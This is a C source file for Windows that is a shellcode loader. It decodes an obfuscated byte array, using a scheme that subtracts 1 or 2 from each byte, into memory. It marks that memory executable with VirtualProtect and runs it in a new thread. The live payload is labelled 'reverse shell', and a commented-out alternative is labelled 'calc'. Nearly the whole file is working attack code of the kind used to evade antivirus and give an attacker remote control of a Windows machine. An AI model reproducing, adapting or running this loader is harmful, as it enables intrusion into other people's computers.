#include <Windows.h>
#include <stdio.h>

// calc
//unsigned char payload[] = { 0xfd, 0x4a, 0x84, 0xe6, 0xf1, 0xea, 0xc1, 0x2, 0x1, 0x2, 0x42, 0x53, 0x42, 0x52, 0x53, 0x53, 0x57, 0x4a, 0x32, 0xd4, 0x66, 0x4a, 0x8c, 0x54, 0x61, 0x4a, 0x8c, 0x54, 0x19, 0x4a, 0x8c, 0x54, 0x21, 0x4a, 0x8c, 0x74, 0x51, 0x4a, 0x10, 0xb9, 0x4b, 0x4c, 0x4e, 0x33, 0xca, 0x4a, 0x32, 0xc2, 0xad, 0x3e, 0x62, 0x7e, 0x3, 0x2e, 0x21, 0x43, 0xc2, 0xcb, 0xe, 0x43, 0x2, 0xc3, 0xe3, 0xef, 0x53, 0x43, 0x52, 0x4a, 0x8c, 0x54, 0x21, 0x8d, 0x43, 0x3e, 0x49, 0x3, 0xd1, 0x8d, 0x81, 0x8a, 0x1, 0x2, 0x1, 0x4a, 0x86, 0xc2, 0x75, 0x69, 0x49, 0x3, 0xd1, 0x52, 0x8c, 0x4a, 0x19, 0x46, 0x8c, 0x42, 0x21, 0x4b, 0x2, 0xd2, 0xe4, 0x58, 0x49, 0x101, 0xca, 0x43, 0x8c, 0x36, 0x89, 0x4a, 0x2, 0xd8, 0x4e, 0x33, 0xca, 0x4a, 0x32, 0xc2, 0xad, 0x43, 0xc2, 0xcb, 0xe, 0x43, 0x2, 0xc3, 0x39, 0xe2, 0x76, 0xf3, 0x4d, 0x5, 0x4d, 0x26, 0x9, 0x47, 0x3a, 0xd3, 0x76, 0xda, 0x59, 0x46, 0x8c, 0x42, 0x25, 0x4b, 0x2, 0xd2, 0x67, 0x43, 0x8c, 0xe, 0x49, 0x46, 0x8c, 0x42, 0x1d, 0x4b, 0x2, 0xd2, 0x42, 0x8d, 0x5, 0x8a, 0x49, 0x3, 0xd1, 0x43, 0x59, 0x43, 0x59, 0x60, 0x5a, 0x5c, 0x42, 0x5a, 0x42, 0x5b, 0x42, 0x5c, 0x49, 0x85, 0xed, 0x22, 0x42, 0x54, 0x100, 0xe2, 0x59, 0x43, 0x5a, 0x5c, 0x49, 0x8d, 0x13, 0xeb, 0x58, 0x101, 0x100, 0x101, 0x5e, 0x4a, 0xbb, 0x3, 0x1, 0x2, 0x1, 0x2, 0x1, 0x2, 0x1, 0x4a, 0x8e, 0x8f, 0x2, 0x3, 0x1, 0x2, 0x42, 0xbc, 0x32, 0x8d, 0x70, 0x89, 0x100, 0xd7, 0xbc, 0xf2, 0xb6, 0xa4, 0x57, 0x43, 0xbb, 0xa8, 0x96, 0xbf, 0x9e, 0x101, 0xd6, 0x4a, 0x84, 0xc6, 0x29, 0x3e, 0x7, 0x7e, 0xb, 0x82, 0xfc, 0xe2, 0x76, 0x7, 0xbc, 0x49, 0x14, 0x74, 0x70, 0x6c, 0x1, 0x5b, 0x42, 0x8b, 0xdb, 0x101, 0xd6, 0x65, 0x62, 0x6e, 0x64, 0x30, 0x66, 0x7a, 0x66, 0x2 };
// reverse shell
unsigned char payload[] = { 0xfd, 0x4a, 0x84, 0xe6, 0xf1, 0xea, 0xc1, 0x2, 0x1, 0x2, 0x42, 0x53, 0x42, 0x52, 0x53, 0x53, 0x57, 0x4a, 0x32, 0xd4, 0x66, 0x4a, 0x8c, 0x54, 0x61, 0x4a, 0x8c, 0x54, 0x19, 0x4a, 0x8c, 0x54, 0x21, 0x4a, 0x8c, 0x74, 0x51, 0x4a, 0x10, 0xb9, 0x4b, 0x4c, 0x4e, 0x33, 0xca, 0x4a, 0x32, 0xc2, 0xad, 0x3e, 0x62, 0x7e, 0x3, 0x2e, 0x21, 0x43, 0xc2, 0xcb, 0xe, 0x43, 0x2, 0xc3, 0xe3, 0xef, 0x53, 0x43, 0x52, 0x4a, 0x8c, 0x54, 0x21, 0x8d, 0x43, 0x3e, 0x49, 0x3, 0xd1, 0x8d, 0x81, 0x8a, 0x1, 0x2, 0x1, 0x4a, 0x86, 0xc2, 0x75, 0x69, 0x49, 0x3, 0xd1, 0x52, 0x8c, 0x4a, 0x19, 0x46, 0x8c, 0x42, 0x21, 0x4b, 0x2, 0xd2, 0xe4, 0x58, 0x49, 0x101, 0xca, 0x43, 0x8c, 0x36, 0x89, 0x4a, 0x2, 0xd8, 0x4e, 0x33, 0xca, 0x4a, 0x32, 0xc2, 0xad, 0x43, 0xc2, 0xcb, 0xe, 0x43, 0x2, 0xc3, 0x39, 0xe2, 0x76, 0xf3, 0x4d, 0x5, 0x4d, 0x26, 0x9, 0x47, 0x3a, 0xd3, 0x76, 0xda, 0x59, 0x46, 0x8c, 0x42, 0x25, 0x4b, 0x2, 0xd2, 0x67, 0x43, 0x8c, 0xe, 0x49, 0x46, 0x8c, 0x42, 0x1d, 0x4b, 0x2, 0xd2, 0x42, 0x8d, 0x5, 0x8a, 0x49, 0x3, 0xd1, 0x43, 0x59, 0x43, 0x59, 0x60, 0x5a, 0x5c, 0x42, 0x5a, 0x42, 0x5b, 0x42, 0x5c, 0x49, 0x85, 0xed, 0x22, 0x42, 0x54, 0x100, 0xe2, 0x59, 0x43, 0x5a, 0x5c, 0x49, 0x8d, 0x13, 0xeb, 0x58, 0x101, 0x100, 0x101, 0x5e, 0x4b, 0xbf, 0x79, 0x74, 0x34, 0x60, 0x35, 0x33, 0x2, 0x1, 0x43, 0x57, 0x4b, 0x8a, 0xe8, 0x49, 0x83, 0xed, 0xa2, 0x2, 0x2, 0x1, 0x4b, 0x8a, 0xe7, 0x4a, 0xbe, 0x3, 0x2, 0x5, 0xd4, 0x65, 0x5d, 0xb1, 0xf, 0x42, 0x56, 0x4a, 0x8b, 0xe5, 0x4e, 0x8a, 0xf3, 0x42, 0xbc, 0x4d, 0x79, 0x27, 0x9, 0x100, 0xd7, 0x4d, 0x8b, 0xeb, 0x6a, 0x2, 0x3, 0x1, 0x2, 0x5a, 0x43, 0xbb, 0x2b, 0x81, 0x6d, 0x1, 0x101, 0xd6, 0x52, 0x51, 0x4f, 0x32, 0xcb, 0x4e, 0x33, 0xc1, 0x4a, 0x100, 0xc2, 0x49, 0x8b, 0xc3, 0x4a, 0x100, 0xc2, 0x49, 0x8b, 0xc2, 0x43, 0xbb, 0xec, 0x10, 0xe1, 0xe1, 0x101, 0xd6, 0x4a, 0x8a, 0xc9, 0x6b, 0x12, 0x42, 0x5a, 0x4d, 0x8b, 0xe3, 0x4a, 0x8a, 0xfb, 0x42, 0xbc, 0x9a, 0xa7, 0x75, 0x63, 0x100, 0xd7, 0x49, 0x83, 0xc5, 0x42, 0x3, 0x2, 0x1, 0x4b, 0xb9, 0x65, 0x6e, 0x66, 0x1, 0x2, 0x1, 0x2, 0x1, 0x43, 0x51, 0x43, 0x51, 0x4a, 0x8a, 0xe4, 0x58, 0x59, 0x58, 0x4f, 0x32, 0xc2, 0x6b, 0xf, 0x5a, 0x43, 0x51, 0xe4, 0xfd, 0x68, 0xc8, 0x46, 0x25, 0x56, 0x2, 0x3, 0x49, 0x8f, 0x45, 0x26, 0x19, 0xc8, 0x1, 0x6a, 0x49, 0x8b, 0xe7, 0x58, 0x51, 0x43, 0x51, 0x43, 0x51, 0x43, 0x51, 0x4b, 0x100, 0xc2, 0x42, 0x52, 0x4a, 0x101, 0xc9, 0x4f, 0x8a, 0xc3, 0x4d, 0x8b, 0xc2, 0x43, 0xbb, 0x7b, 0xcd, 0x41, 0x87, 0x101, 0xd6, 0x4a, 0x32, 0xd4, 0x49, 0x101, 0xcb, 0x8d, 0xf, 0x43, 0xbb, 0xa, 0x88, 0x1f, 0x61, 0x101, 0xd6, 0xbd, 0xe1, 0x1f, 0x2b, 0xc, 0x42, 0xbc, 0xa7, 0x97, 0xbe, 0x9f, 0x100, 0xd7, 0x49, 0x85, 0xc5, 0x2a, 0x3d, 0x8, 0x7d, 0xc, 0x81, 0xfd, 0xe1, 0x77, 0x6, 0xbd, 0x48, 0x15, 0x73, 0x71, 0x6b, 0x2, 0x5a, 0x43, 0x8a, 0xdc, 0x100, 0xd7 };
DWORD payloadLen = sizeof(payload);

void Decode(unsigned char* payload) {
	for (int i = 0; i < payloadLen; i++) {
		if (i % 2 == 0) {
			payload[i]--;
		}
		else {
			payload[i] -= 2;
		}
	}
}

int main() {
	
	LPVOID alloc_mem = VirtualAlloc(NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}

	Decode(payload);

	/*
	printf("\n[+] After Decode:\n");
	for (int i = 0; i < payloadLen; i++) {
		printf("%2x ,", payload[i]);
	}
	*/
	CopyMemory(alloc_mem, payload, payloadLen);

	DWORD OldProtect;
	if (!VirtualProtect(alloc_mem, payloadLen, PAGE_EXECUTE_READ, &OldProtect)) {
		printf("Failed to Change memory protection (%u)\n", GetLastError());
		return -2;
	}
	
	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to create the Thread (%u)\n", GetLastError());
		return -3;
	}
	WaitForSingleObject(tHandle, INFINITE);

	return 0;
}